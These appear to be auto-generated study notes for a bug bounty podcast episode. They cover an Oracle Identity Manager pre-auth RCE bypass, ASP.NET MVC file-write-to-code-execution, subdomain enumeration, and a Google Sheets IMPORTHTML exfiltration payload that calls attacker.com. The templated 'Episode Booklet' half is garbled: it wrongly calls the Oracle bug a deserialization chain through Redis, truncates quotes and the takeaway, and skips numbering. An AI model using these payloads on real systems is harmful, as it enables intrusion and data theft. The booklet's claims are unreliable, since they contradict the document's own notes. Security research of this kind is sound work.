---
title: "ASP.NET MVC Patterns, Popping Oracle Identity, and Esoteric Subdomain Enumeration"
episode: 150
---


# Episode 150 ASP.NET MVC Patterns, Popping Oracle Identity, and Esoteric Subdomain Enumeration

### TL;DR
- Oracle Identity Manager pre-auth RCE (CVE-2025-61757): central security filter bypassed via `;.wadle` path parameter
- ASP.NET MVC View Engine search patterns: procmon → identify which .cshtml paths the engine probes; use arbitrary file write to plant a file there → code execution
- Google Sheets importHTML → data exfiltration via CSV exports from CRMs (Salesforce, Zendesk, HubSpot) and Zapier auto-inserts

### Bugs and Findings

#### Oracle Identity Manager Pre-auth RCE (CVE-2025-61757)
- **Target/context:** Oracle Identity Governance suite
- **Root cause:** Central security filter handling all routes had a regex bypass — developers allowed all `.wadle` files through; appending `;.wadle` to any route bypassed auth
- **Technique / how found:** Searchlight Cyber team grepped WAR files for known path (`/help/pages/main.jspx`), found Oracle IDM UI Shell JAR, identified unauthenticated routes returning 401, checked web.xml for filter logic
- **Exploitation steps:**
  1. Find unauthenticated routes → hit 401
  2. Identify central security filter in web.xml
  3. Discover `.wadle` bypass: `;.wadle` suffix passes filter
  4. Hit `/groovy/script/status` endpoint — compiles Groovy script but doesn't execute
  5. Use custom annotation (Java compile-time processing) to achieve RCE
- **Key technical details:** `request.getRequestURI()` vs `request.getRequestURL()` — bypass must be in path, not query string; `;.wadle` path parameter; Groovy compilation endpoint; Java annotations processed at compile time
- **Impact:** Pre-auth RCE

#### ASP.NET MVC View Engine File Write → Code Execution
- **Target/context:** ASP.NET MVC applications with arbitrary file write
- **Root cause:** MVC framework probes for `.cshtml` files based on controller/action name; if you can write to those paths, code executes
- **Technique / how found:** ProcMon on the ASP.NET process — observed file reads for specific `.cshtml` paths not existing
- **Exploitation steps:**
  1. Identify MVC route pattern (`/Controller/Action`)
  2. Use procmon to see which file paths the framework probes
  3. Use arbitrary file write to plant `.cshtml` at those probed paths
  4. MVC engine executes the `.cshtml` code
- **Key technical details:** web.config often allows `.` (dot/extensionless) files — aligns with MVC routes; probes paths like `/Views/Controller/Action.cshtml`

#### Google Sheets importHTML → Data Exfiltration
- **Target/context:** Google Sheets + CRM apps (Salesforce, Zendesk, HubSpot) + Zapier
- **Root cause:** `=IMPORTHTML` function in Google Sheets makes client-side fetch requests with dynamic data; when employees export CSVs from CRMs and import to Sheets, or when Zapier auto-inserts rows, injection payloads persist
- **Technique / how found:** Sprayed payloads across bug bounty forms; no immediate hit, but days/weeks later got callbacks when data was processed downstream
- **Key technical details:** Payload: `=IMPORTHTML("https://attacker.com/"&CONCATENATE(data),"table")`; Google Forms sanitizes, but copy-paste and Zapier auto-inserts do not
- **Impact:** Data exfiltration of form submissions, CRM data

### Techniques and Primitives
**Central Filter Bypass via Path Parameter** — When a central security filter tries to allow specific file types (e.g., `.wadle`), use path parameter syntax (`;.wadle`) to bypass auth to any route

**NSEC/NSEC3 Zone Walking** — DNSSEC record types prove non-existence by pointing to next existing name; NSEC3 returns hashed names — offline crack them with `nsec3map`

**CZDS (Centralized Zone Data Service)** — ICANN allows requesting zone files for participating TLDs — request all subdomains for a TLD at once

### Suggestions and Advices from Hunter
- Joseph on the blind XSS via Google Sheets: "It's totally client-side... success came days and weeks later when that data was then used at some point by an employee down the line."
- Justin on the Oracle bug: "At Searchlight Cyber, we have found that central filters like this are almost always bypassable."
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Oracle Identity Manager pre-auth RCE (CVE-2025-61757): central security filter bypassed via `;.wadle` path parameter

#### 2. What you should learn
- Learn about **oracle identity manager pre-auth rce (cve-2025-61757): central security filter bypassed via `;.wadle` path parameter**
- Learn about **asp.net mvc view engine search patterns: procmon → identify which .cshtml paths the engine probes; use arbitrary file write to plant a file there → code execution**
- Learn about **google sheets importhtml → data exfiltration via csv exports from crms (salesforce, zendesk, hubspot) and zapier auto-inserts**

#### 3. Core concepts explained
**Oracle Identity Manager Pre-auth RCE (CVE-2025-61757)**
- **What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains.
- **Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE).
- **Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication.

**ASP.NET MVC View Engine File Write → Code Execution**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Google Sheets importHTML → Data Exfiltration**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.


#### 4. Techniques and tactics
**Systematic Testing Approach**
- **What it is:** Methodical testing of application features for vulnerability classes
- **When to use it:** Always — systematic testing catches bugs that ad-hoc testing misses
- **What can go wrong:** Spending too much time on low-probability paths


#### 5. Good Quotes
- *"Joseph on the blind XSS via Google Sheets: "It's totally client-side... success came days and weeks later when that data was then used at some point by an employee down the line."*
- *"Justin on the Oracle bug: "At Searchlight Cyber, we have found that central filters like this are almost always bypassable."*

#### 6. Mental models
- **Joseph on the blind XSS via Google Sheets: "It's totally cli** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Justin on the Oracle bug: "At Searchlight Cyber, we have fou** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Pick a bug class from this episode and find 3 real examples on HackerOne bug reports
- **Practice:** Set up a local vulnerable application (DVWA, Juice Shop) and practice the exploitation techniques
- **Watch for:** Similar patterns in your own targets — the vulnerability classes discussed are common across web applications

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **RCE** — Remote Code Execution — running arbitrary code on a target server
- **API** — Application Programming Interface — structured endpoints for data exchange
- **ACL** — Access Control List — permissions defining who can access what

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Oracle Identity Manager Pre-auth RCE (CVE-2025-61757)?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.
8. **Reflection:** What would you do differently if you had to redo this testing from scratch?

#### 11. The practical takeaway
1. **Oracle Identity Manager pre-auth RCE (CVE-2025-61757): central security filter b**
